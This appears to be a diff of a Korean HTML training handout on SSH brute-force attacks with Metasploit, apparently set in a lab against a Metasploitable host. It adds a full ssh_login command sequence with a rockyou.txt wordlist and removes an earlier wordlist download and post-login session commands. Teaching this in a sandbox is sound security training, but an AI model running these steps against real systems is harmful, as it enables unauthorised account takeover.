@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SSH Brute Force (SSH 무차별 대입 공격) 전문 교재 - V3.4</title>
+    <title>SSH Brute Force (SSH 무차별 대입 공격) 전문 교재 - V3.5</title>
     <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -25,7 +25,7 @@
         .indent-line { border-left: 3px solid #0ea5e9; padding-left: 2rem; margin: 2rem 0; }
         .highlight-cyan { color: #22d3ee; font-weight: 700; }
         .highlight-red { color: #f87171; font-weight: 700; }
-        .highlight-green { color: #4ade80; font-weight: 700; }
+        .highlight-yellow { color: #fbbf24; font-weight: 700; }
         ::-webkit-scrollbar { width: 10px; }
         ::-webkit-scrollbar-track { background: #020617; }
         ::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 5px; }
@@ -41,12 +41,12 @@
             <div>
                 <div class="flex items-center gap-3 mb-4">
                     <span class="bg-gradient-to-r from-cyan-600 to-blue-600 text-white px-3 py-1 text-xs font-black uppercase tracking-[0.2em] rounded-md shadow-lg shadow-cyan-500/20">Infrastructure Security Lab</span>
-                    <span class="text-slate-500 font-mono text-xs">V.3.4.0 | EXPERT ARCHITECT</span>
+                    <span class="text-slate-500 font-mono text-xs">V.3.5.0 | EXPERT ARCHITECT</span>
                 </div>
                 <h1 class="text-5xl font-black text-transparent bg-clip-text bg-gradient-to-br from-white via-slate-300 to-slate-500 tracking-tighter leading-none mb-2">
                     SSH Brute Force Attack Analysis
                 </h1>
-                <p class="text-cyan-500 text-xl font-medium tracking-tight italic">최종 실행 결과 분석 및 세션 제어(Session Control) 메커니즘</p>
+                <p class="text-cyan-500 text-xl font-medium tracking-tight italic">명령어 구문 무결성(Syntax Integrity) 및 모듈 로딩 가이드</p>
             </div>
             <div class="text-right border-l border-slate-800 pl-8 pb-2">
                 <div class="text-xs text-slate-500 uppercase font-bold tracking-widest mb-1">Threat Assessment</div>
@@ -57,66 +57,50 @@
 
     <main class="max-w-7xl mx-auto px-8 py-20 space-y-32">
 
-        <!-- [Section 01] 사전 파일 수립 -->
-        <section>
-            <div class="flex items-center gap-4 mb-12">
-                <div class="h-1 w-12 bg-blue-500"></div>
-                <h2 class="text-4xl font-black text-slate-100 uppercase tracking-tight">01. 고성능 사전 파일(Wordlists) 확보</h2>
-            </div>
-            <div class="section-card rounded-[3rem] p-16 space-y-12 shadow-2xl">
-                <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
-                    <div class="space-y-6">
-                        <h4 class="text-lg font-bold text-white flex items-center gap-3"><i data-lucide="download" class="text-blue-400"></i> 데이터셋 다운로드 전략</h4>
-                        <p class="text-sm text-slate-400 leading-relaxed">
-                            공격 성공의 90%는 사전 파일의 품질에 달려있습니다. <span class="highlight-cyan font-bold italic">rockyou.txt</span>를 최신 릴리스 경로에서 확보하여 즉시 사용 가능한 상태로 유지합니다.
-                        </p>
-                        <div class="terminal-bg rounded-2xl p-6 font-mono text-xs border border-blue-900/30">
-                            <div class="text-slate-600 italic"># 최신 릴리스 경로에서 평문(Plain Text) 파일 다운로드</div>
-                            <div class="text-white">wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</div>
-                            <div class="text-slate-600 italic mt-4"># 파일 무결성 및 리스트 확인 (상위 5줄)</div>
-                            <div class="text-white">head -n 5 rockyou.txt</div>
-                        </div>
-                    </div>
-                    <div class="image-placeholder">
-                        <i data-lucide="server" class="w-12 h-12 text-slate-700 mb-4"></i>
-                        <span class="text-[10px] text-slate-500 uppercase tracking-widest">Repository Status</span>
-                        <div class="mt-4 p-4 bg-slate-900 rounded-xl border border-slate-800 text-center">
-                            <div class="text-xs text-green-500 font-bold tracking-tighter">DOWNLOAD COMPLETE</div>
-                            <div class="text-[9px] text-slate-600 mt-1">Stored at /root/rockyou.txt</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <div class="page-marker"></div>
-
-        <!-- [Section 02] 명령어 구문 오류 해결 (Prompt vs Command) -->
+        <!-- [Section 01] 모듈 로딩 오류 해결 -->
         <section>
             <div class="flex items-center gap-4 mb-12">
                 <div class="h-1 w-12 bg-red-500"></div>
-                <h2 class="text-4xl font-black text-slate-100 uppercase tracking-tight">02. 명령어 구문(Syntax) 및 프롬프트 분리</h2>
+                <h2 class="text-4xl font-black text-slate-100 uppercase tracking-tight">01. 모듈 로딩 실패(Failed to load module) 해결</h2>
             </div>
-            <div class="section-card rounded-[3rem] p-16 space-y-12">
+            <div class="section-card rounded-[3rem] p-16 space-y-12 shadow-2xl">
                 <div class="prose prose-invert max-w-none text-slate-400">
                     <p class="text-lg leading-relaxed">
-                        메타스플로잇 프롬프트 문자열인 <span class="highlight-red italic">msf auxiliary(scanner/ssh/ssh_login) ></span> 은 입력해야 할 명령어가 아닙니다. 이는 사용자의 현재 위치를 알려주는 <span class="text-white">Indicator (지표)</span>일 뿐입니다.
+                        메타스플로잇에서 모듈을 불러올 때 가장 자주 발생하는 실수는 <span class="highlight-red italic">Path Syntax (경로 구문)</span>의 오류입니다. 메타스플로잇의 모든 모듈 경로는 <span class="text-white font-bold underline decoration-cyan-500">슬래시(/)</span>로 구분하며, 괄호(())는 프롬프트의 상태 정보를 나타낼 뿐 경로의 일부가 아닙니다.
                     </p>
                 </div>
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-                    <div class="bg-red-500/5 border border-red-500/20 p-8 rounded-[2rem]">
-                        <h5 class="text-red-400 font-black text-xs uppercase mb-4 tracking-widest italic">BAD: Prompt Overlap</h5>
-                        <div class="terminal-bg p-6 rounded-xl font-mono text-[10px] opacity-50">
-                            <span class="text-slate-500">msf6... ></span> <span class="text-red-400 underline decoration-red-500">auxiliary(scanner/ssh/ssh_login) > set RHOSTS...</span>
+
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
+                    <!-- Syntax Comparison -->
+                    <div class="space-y-6">
+                        <div class="bg-red-500/10 border border-red-500/20 p-8 rounded-2xl">
+                            <h5 class="text-red-400 font-black text-xs uppercase mb-4 flex items-center gap-2"><i data-lucide="x-octagon"></i> Incorrect Syntax</h5>
+                            <div class="terminal-bg p-4 rounded-lg font-mono text-[11px] text-red-300">
+                                msf6 > use auxiliary<span class="bg-red-500/40 text-white font-bold px-1">(scanner/ssh/ssh_login)</span>
+                            </div>
+                            <p class="mt-4 text-[10px] text-slate-500 italic">결과: [-] No results from search. 메타스플로잇은 괄호가 포함된 경로를 인식하지 못합니다.</p>
                         </div>
-                        <p class="mt-4 text-[10px] text-slate-500">프롬프트를 명령어와 함께 복사하면 <span class="text-red-400 font-bold">Unknown Command</span> 에러가 발생합니다.</p>
+
+                        <div class="bg-green-500/10 border border-green-500/20 p-8 rounded-2xl">
+                            <h5 class="text-green-400 font-black text-xs uppercase mb-4 flex items-center gap-2"><i data-lucide="check-circle"></i> Correct Syntax</h5>
+                            <div class="terminal-bg p-4 rounded-lg font-mono text-[11px] text-green-300">
+                                msf6 > use auxiliary<span class="bg-green-500/40 text-white font-bold px-1">/scanner/ssh/ssh_login</span>
+                            </div>
+                            <p class="mt-4 text-[10px] text-slate-500 italic">결과: 모듈이 정상적으로 로드되며 프롬프트가 변경됩니다.</p>
+                        </div>
                     </div>
-                    <div class="bg-green-500/5 border border-green-500/20 p-8 rounded-[2rem]">
-                        <h5 class="text-green-400 font-black text-xs uppercase mb-4 tracking-widest italic">GOOD: Clean Input</h5>
-                        <div class="terminal-bg p-6 rounded-xl font-mono text-[10px]">
-                            <span class="text-slate-500">msf6... ></span> <span class="text-cyan-400 font-bold">set RHOSTS 192.168.10.13</span>
+
+                    <!-- Schematic Diagram -->
+                    <div class="image-placeholder">
+                        <i data-lucide="layout-template" class="w-12 h-12 text-slate-700 mb-4"></i>
+                        <span class="text-[10px] text-slate-500 uppercase tracking-widest mb-6 text-center">MSF Module Structure</span>
+                        <div class="w-full flex flex-col gap-2 font-mono text-[10px]">
+                            <div class="flex items-center gap-2 text-slate-400"><i data-lucide="folder" class="w-3 h-3 text-yellow-600"></i> auxiliary</div>
+                            <div class="flex items-center gap-2 pl-4 text-slate-400"><i data-lucide="corner-down-right" class="w-3 h-3 text-slate-600"></i> <i data-lucide="folder" class="w-3 h-3 text-yellow-600"></i> scanner</div>
+                            <div class="flex items-center gap-2 pl-8 text-slate-400"><i data-lucide="corner-down-right" class="w-3 h-3 text-slate-600"></i> <i data-lucide="folder" class="w-3 h-3 text-yellow-600"></i> ssh</div>
+                            <div class="flex items-center gap-2 pl-12 text-cyan-400"><i data-lucide="corner-down-right" class="w-3 h-3 text-slate-600"></i> <i data-lucide="file-code" class="w-3 h-3 text-cyan-500"></i> ssh_login</div>
                         </div>
-                        <p class="mt-4 text-[10px] text-slate-500">오직 <span class="text-white font-bold">set, run, use</span>와 같은 행위(Verb) 명령어로 시작하십시오.</p>
+                        <p class="mt-6 text-[9px] text-slate-600 italic">모든 경로는 '슬래시(/)'로 연결되어야 합니다.</p>
                     </div>
                 </div>
             </div>
@@ -124,67 +108,80 @@
 
         <div class="page-marker"></div>
 
-        <!-- [Section 03] 최종 결과물 예제 및 세션 상호작용 (신규 섹션) -->
+        <!-- [Section 02] 최종 공격 시퀀스: 완벽한 명령어 순서 -->
         <section>
             <div class="flex items-center gap-4 mb-12">
-                <div class="h-1 w-12 bg-green-500"></div>
-                <h2 class="text-4xl font-black text-slate-100 uppercase tracking-tight">03. 공격 성공 결과 및 세션 상호작용 (Result Example)</h2>
+                <div class="h-1 w-12 bg-cyan-500"></div>
+                <h2 class="text-4xl font-black text-slate-100 uppercase tracking-tight">02. 정밀 공격 시퀀스 (Full Command Sequence)</h2>
             </div>
-            <div class="section-card rounded-[3rem] p-16 space-y-16">
-                
-                <!-- Terminal Output: Successful Login -->
-                <div class="space-y-6">
-                    <h4 class="text-lg font-bold text-white flex items-center gap-3"><i data-lucide="terminal" class="text-green-400"></i> 공격 엔진 실행 결과 (Attack Output)</h4>
-                    <p class="text-sm text-slate-400">공격이 성공하면 시스템은 인증된 계정 정보를 출력하고 백그라운드에 <span class="highlight-cyan font-bold italic">Session (세션, 상호작용 연결)</span>을 생성합니다.</p>
-                    <div class="terminal-bg rounded-3xl p-10 font-mono text-xs leading-loose border-l-8 border-green-600 shadow-2xl">
-                        <div class="text-slate-500 italic"># 공격 엔진 가동 후 출력되는 성공 메시지</div>
-                        <div class="text-white">msf6 auxiliary(scanner/ssh/ssh_login) > <span class="text-cyan-400">run</span></div>
-                        <div class="text-slate-400 mt-4">[*] 192.168.10.13:22 - Starting SSH login scanner...</div>
-                        <div class="text-slate-400">[*] 192.168.10.13:22 - Attempting 'root':'password'</div>
-                        <div class="text-green-400 font-black mt-2">
-                            <span class="bg-green-900/30 px-2 py-1">[+] 192.168.10.13:22 - Success: 'msfadmin':'msfadmin' (Session 1 Opened)</span>
-                        </div>
-                        <div class="text-slate-400 mt-2">[*] Scanned 1 of 1 hosts (100% complete)</div>
-                        <div class="text-cyan-400 font-bold mt-4">[*] Auxiliary module execution completed</div>
-                    </div>
+            <div class="section-card rounded-[3rem] p-16 space-y-12">
+                <div class="prose prose-invert max-w-none">
+                    <p class="text-slate-400 leading-relaxed">
+                        침투 테스트를 성공시키기 위해 필요한 <span class="highlight-cyan font-bold italic">Step-by-Step</span> 명령어 리스트입니다. 복사하여 사용할 때 프롬프트 기호(`>`) 앞부분이 포함되지 않도록 주의하십시오.
+                    </p>
                 </div>
 
-                <!-- Interaction Example -->
-                <div class="grid grid-cols-1 lg:grid-cols-2 gap-12">
-                    <div class="space-y-6">
-                        <h4 class="text-lg font-bold text-white flex items-center gap-3"><i data-lucide="command" class="text-yellow-400"></i> 세션 제어 (Session Interaction)</h4>
-                        <p class="text-sm text-slate-400 leading-relaxed">
-                            열려있는 세션을 확인하고, 해당 세션 내부로 진입하여 <span class="highlight-yellow font-bold italic">Post-Exploitation (침투 후 단계)</span> 명령을 수행합니다.
-                        </p>
-                        <div class="terminal-bg rounded-2xl p-8 font-mono text-xs border border-yellow-900/30">
-                            <div class="text-slate-600 italic"># 활성화된 세션 리스트 확인</div>
-                            <div class="text-white">msf6 > <span class="text-cyan-400">sessions</span></div>
-                            <div class="text-slate-500 mt-2">Id  Type  Information  Connection</div>
-                            <div class="text-slate-500">--  ----  -----------  ----------</div>
-                            <div class="text-green-400">1   shell linux        192.168.1.5:4444 -> 192.168.10.13:22</div>
-                            
-                            <div class="text-slate-600 italic mt-6"># 세션 1번으로 진입 (Interaction)</div>
-                            <div class="text-white">msf6 > <span class="text-cyan-400">sessions -i 1</span></div>
-                            <div class="text-yellow-500 mt-2 italic">[*] Starting interaction with 1...</div>
-                        </div>
-                    </div>
+                <!-- Command Flow Table -->
+                <div class="overflow-hidden rounded-2xl border border-slate-800">
+                    <table class="w-full text-left font-mono text-[11px]">
+                        <thead class="bg-slate-900 text-slate-500 uppercase">
+                            <tr>
+                                <th class="px-6 py-4 border-b border-slate-800">Step</th>
+                                <th class="px-6 py-4 border-b border-slate-800">Command (입력할 명령어)</th>
+                                <th class="px-6 py-4 border-b border-slate-800">Description (설명)</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-slate-800">
+                            <tr class="hover:bg-slate-900/40 transition-colors">
+                                <td class="px-6 py-4 text-cyan-500 font-bold">01</td>
+                                <td class="px-6 py-4 text-white">use auxiliary/scanner/ssh/ssh_login</td>
+                                <td class="px-6 py-4 text-slate-500 italic">로그인 스캔 모듈 선택</td>
+                            </tr>
+                            <tr class="hover:bg-slate-900/40 transition-colors">
+                                <td class="px-6 py-4 text-cyan-500 font-bold">02</td>
+                                <td class="px-6 py-4 text-white">set RHOSTS 192.168.10.13</td>
+                                <td class="px-6 py-4 text-slate-500 italic">공격 대상 서버 IP 주소 설정</td>
+                            </tr>
+                            <tr class="hover:bg-slate-900/40 transition-colors">
+                                <td class="px-6 py-4 text-cyan-500 font-bold">03</td>
+                                <td class="px-6 py-4 text-white">set PASS_FILE /root/rockyou.txt</td>
+                                <td class="px-6 py-4 text-slate-500 italic">패스워드 사전 파일 경로 지정</td>
+                            </tr>
+                            <tr class="hover:bg-slate-900/40 transition-colors">
+                                <td class="px-6 py-4 text-cyan-500 font-bold">04</td>
+                                <td class="px-6 py-4 text-white">set USER_FILE /root/users.txt</td>
+                                <td class="px-6 py-4 text-slate-500 italic">사용자 아이디 리스트 경로 지정</td>
+                            </tr>
+                            <tr class="hover:bg-slate-900/40 transition-colors">
+                                <td class="px-6 py-4 text-cyan-500 font-bold">05</td>
+                                <td class="px-6 py-4 text-white">set VERBOSE true</td>
+                                <td class="px-6 py-4 text-slate-500 italic">실시간 대입 시도 과정 출력 활성화</td>
+                            </tr>
+                            <tr class="hover:bg-slate-900/40 transition-colors">
+                                <td class="px-6 py-4 text-cyan-500 font-bold">06</td>
+                                <td class="px-6 py-4 text-white">set THREADS 5</td>
+                                <td class="px-6 py-4 text-slate-500 italic">공격 속도 향상을 위한 스레드 설정</td>
+                            </tr>
+                            <tr class="hover:bg-slate-900/40 transition-colors bg-cyan-500/5">
+                                <td class="px-6 py-4 text-cyan-500 font-bold">07</td>
+                                <td class="px-6 py-4 text-cyan-400 font-bold animate-pulse">run</td>
+                                <td class="px-6 py-4 text-slate-400 italic font-bold">무차별 대입 공격 엔진 가동</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
 
-                    <div class="space-y-6">
-                        <h4 class="text-lg font-bold text-white flex items-center gap-3"><i data-lucide="eye" class="text-cyan-400"></i> 시스템 장악 증적 (Proof of Access)</h4>
-                        <p class="text-sm text-slate-400 leading-relaxed">진입한 세션에서 타겟 서버의 정보를 직접 확인하여 침투 성공을 증명합니다.</p>
-                        <div class="terminal-bg rounded-2xl p-8 font-mono text-xs border border-cyan-900/30 bg-slate-950">
-                            <div class="text-slate-500 italic"># 현재 로그인된 사용자 확인 (Who am I)</div>
-                            <div class="text-white">msfadmin@metasploitable:~$ <span class="text-cyan-400">whoami</span></div>
-                            <div class="text-green-400 font-bold">msfadmin</div>
-                            
-                            <div class="text-slate-500 italic mt-4"># 커널 버전 및 시스템 정보 확인 (Kernel Info)</div>
-                            <div class="text-white">msfadmin@metasploitable:~$ <span class="text-cyan-400">uname -a</span></div>
-                            <div class="text-slate-300">Linux metasploitable 2.6.24-16-server #1 SMP... i686 GNU/Linux</div>
-                        </div>
-                        <div class="flex items-center gap-2 p-4 bg-green-500/10 rounded-xl border border-green-500/20">
-                            <i data-lucide="check-square" class="text-green-500 w-4 h-4"></i>
-                            <span class="text-[10px] text-green-600 font-bold uppercase tracking-widest">Compromise Verified</span>
-                        </div>
+                <!-- Architect's Checklist -->
+                <div class="bg-cyan-500/5 border border-cyan-500/20 p-8 rounded-2xl relative overflow-hidden">
+                    <div class="absolute -right-4 -bottom-4 opacity-5"><i data-lucide="check-circle-2" class="w-32 h-32"></i></div>
+                    <h5 class="text-cyan-400 font-black text-xs uppercase mb-6 tracking-widest flex items-center gap-2">
+                        <i data-lucide="shield-check"></i> Pre-Execution Checklist (실행 전 점검 사항)
+                    </h5>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-[11px] text-slate-400 italic">
+                        <div class="flex items-center gap-3"><i data-lucide="circle" class="w-2 h-2 fill-cyan-500"></i> 타겟 서버(192.168.10.13)와 네트워크 통신이 가능한가?</div>
+                        <div class="flex items-center gap-3"><i data-lucide="circle" class="w-2 h-2 fill-cyan-500"></i> rockyou.txt 파일이 해당 경로에 실제로 존재하는가?</div>
+                        <div class="flex items-center gap-3"><i data-lucide="circle" class="w-2 h-2 fill-cyan-500"></i> msfconsole 프롬프트가 'auxiliary(scanner/ssh/ssh_login)'인가?</div>
+                        <div class="flex items-center gap-3"><i data-lucide="circle" class="w-2 h-2 fill-cyan-500"></i> PostgreSQL DB가 연결되어 있는가? (db_status 확인)</div>
                     </div>
                 </div>
             </div>
@@ -192,6 +189,7 @@
 
     </main>
 
+    <!-- Footer -->
     <footer class="max-w-7xl mx-auto px-8 py-20 border-t border-slate-800 text-center">
         <div class="text-slate-500 font-mono text-[10px] tracking-[0.4em] uppercase mb-8">
             © 2026 GLOBAL INFRASTRUCTURE SECURITY ARCHITECT GROUP.
@@ -201,12 +199,8 @@
                 <i data-lucide="alert-triangle"></i> Legal Compliance & Ethics
             </h4>
             <p class="text-slate-600 text-[10px] leading-relaxed italic">
-                모든 공격 실습은 독립된 샌드박스 네트워크 환경에서만 수행되어야 합니다. 타인의 시스템에 대한 무단 접근은 정보통신망법에 의해 강력히 처벌됩니다.
+                모듈 로딩 실패는 단순한 타이핑 오류에서 시작됩니다. 정확한 경로(Forward Slash) 입력을 습관화하십시오. 허가되지 않은 시스템에 대한 스캔은 엄격히 금지됩니다.
             </p>
-        </div>
-        <div class="mt-12 flex justify-center gap-4">
-            <span class="px-4 py-1.5 bg-slate-800 rounded-full text-[10px] text-slate-400 font-bold shadow-lg">ISO/IEC 27001</span>
-            <span class="px-4 py-1.5 bg-slate-800 rounded-full text-[10px] text-slate-400 font-bold shadow-lg">NIST 800-115</span>
         </div>
     </footer>
 
